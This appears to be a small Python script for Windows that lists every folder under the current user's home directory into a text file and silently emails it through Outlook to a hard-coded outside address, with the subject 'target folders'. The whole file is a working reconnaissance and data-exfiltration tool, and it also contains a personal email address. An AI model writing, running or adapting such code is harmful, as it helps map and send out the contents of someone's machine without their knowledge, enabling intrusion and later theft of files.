import win32com.client as win32
import os
import getpass
username = getpass.getuser()
adresses = ['martin.pezous-puech@live.fr']
directory = 'C:/users/' + str(username)

os.system('cd C:/users/' + str(username))
os.chdir('C:/users/' + str(username))
os.system('dir /A:D /B /S > C:/users/' + str(username) + '/FolderList.txt')

print(str(directory) + 'FolderList.txt')


for adress in adresses:

        outlook = win32.Dispatch('Outlook.Application')
        mail = outlook.CreateItem(0)
        mail.To = adress
        mail.Subject = 'target folders'
        mail.Body = ''
        mail.Attachments.Add(directory + '/FolderList.txt')
        mail.HTMLBody = ''
        mail.Send()